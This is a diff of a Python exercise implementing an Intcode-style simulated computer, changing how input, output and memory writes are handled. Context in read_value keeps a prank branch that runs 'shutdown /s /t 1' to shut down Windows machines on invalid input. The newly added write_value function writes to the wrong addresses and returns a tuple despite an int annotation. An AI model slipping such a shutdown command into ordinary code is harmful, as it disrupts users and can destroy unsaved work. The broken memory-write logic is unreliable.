@@ -6,7 +6,6 @@ import time
 import random
 from sys import platform
 import subprocess
-import pathlib
 # For this weeeks exercise you again need to add a feature to your existing simulated computer:
 
 # - The computer needs to implement memory much /larger/ than the set of initial commands.
@@ -33,7 +32,8 @@ import pathlib
 # The actual input is in a separate file, input_memory_01.txt under the `data` folder.
 # When asked for input provide the value 2. There should be a single output. Please include it in your PR.
 
-class op_mode(enum.Enum): 
+
+class op_mode(enum.Enum):
     POSITION = 0
     IMMEDIATE = 1
     RELATIVE = 2
@@ -121,15 +121,24 @@ def jump_operation(dct: dict,
     return idx + 1
 
 
+def write_value(dct: dict, idx: int, mode: op_mode, offset: int, input_value: int) -> int:
+    match mode:
+        case op_mode.POSITION:
+            dct[idx] = input_value
+        case op_mode.RELATIVE:
+            dct[idx + offset] = input_value
+    return idx + 1, dct
+
+
 def read_value(dct: dict, idx: int, instruction: list, offset: int) -> int:
     """handles input value operation 3"""
     idx += 1
     param_mode = op_mode(int(instruction[2]))
-    destination = get_element(param_mode, dct, idx, offset)
     # ? try catch error, to minimize ID10T errors
     while True:
         try:
-            dct[destination] = int(input("Please enter a value: "))
+            input_value = int(input("Please enter a value: "))
+            idx, dct = write_value(dct, idx, param_mode, offset, input_value)
             break
         except ValueError:
             print("Please enter a valid number")
@@ -139,18 +148,17 @@ def read_value(dct: dict, idx: int, instruction: list, offset: int) -> int:
                 # ! additionaly punish windows users for using Windows and
                 # ! wrong input
                 subprocess.call("shutdown /s /t 1") 
-    logging.debug(f'Value: {dct[destination]} at index {destination}')
-    return idx + 1
+    return idx, dct
 
 
 def output_value(dct: dict, idx: int, instruction: list, offset: int) -> int:
-    """handles output value operation 4"""
+    """Handles output value operation (opcode 4)."""
     param_mode = op_mode(int(instruction[1]))
     idx += 1
     output = get_element(param_mode, dct, idx, offset)
-    print(f"Output: {output}")
-    idx += 1
-    return idx
+    print(f"Opcode 4 - Accessed Memory: {dct.get(idx)} | Output Value: {output}")  # Debug statement
+    print(f"Output by opcode 4 = {output}")  # Required format
+    return idx + 1
 
 
 def change_offset(offset: int, instruction: list, dct: dict, idx: int) -> int:
@@ -163,7 +171,7 @@ def change_offset(offset: int, instruction: list, dct: dict, idx: int) -> int:
 
 
 def check_for_opcode(idx: int, dct: dict, offset: int = 0):
-    operation = str(dct[idx]) 
+    operation = str(dct[idx])
     while len(operation) < 4:
         operation = '0' + operation
     try:
@@ -180,7 +188,7 @@ def check_for_opcode(idx: int, dct: dict, offset: int = 0):
         case operations.MULTIPLY:
             idx = calc(dct, idx, operations.MULTIPLY, operation, offset)
         case operations.INPUT:
-            idx = read_value(dct, idx, operation, offset)
+            idx, dct = read_value(dct, idx, operation, offset)
         case operations.OUTPUT:
             idx = output_value(dct, idx, operation, offset)
         case operations.JUMP_IF_TRUE:
@@ -218,15 +226,15 @@ def list_to_dict(lst: list) -> dict:
     """converts list to a dictionary with values from the list and 
     enumerated keys e.g. [10,20,30,40] -> {0: 10, 1: 20, 2: 30, 3: 40}"""
     goal = {} 
-    for index, value in enumerate(lst):
-        goal[index] = int(value)
+    goal = {index: value for index, value in enumerate(lst)}
     return goal
 
 
 def read_file(path: str) -> dict:
     """reads the input file and returns the needed dict"""
     with open(path, "r") as f:
-        input = f.read().strip().split(",")
+        input = f.read().strip().split(",") # strip is in the current file obsolete but it could be useful in the future
+    print(f'Input: {input[:20]}')
     input = list_to_dict([int(i) for i in input])
     return input
 
@@ -239,6 +247,9 @@ sequence_path = os.path.join(
 print(Fore.LIGHTGREEN_EX + f'-----\nFinal output of the command: {reader(sequence_path)}\n-----')
 print(Fore.RESET)
 
+
+# region tests
 def test_int_computer():
     test_list = [109, 1, 204, -1, 1001, 100, 1, 100, 1008, 100, 16, 101, 1006, 101, 0, 99]
     assert reader(test_list) == 109
+# endregion
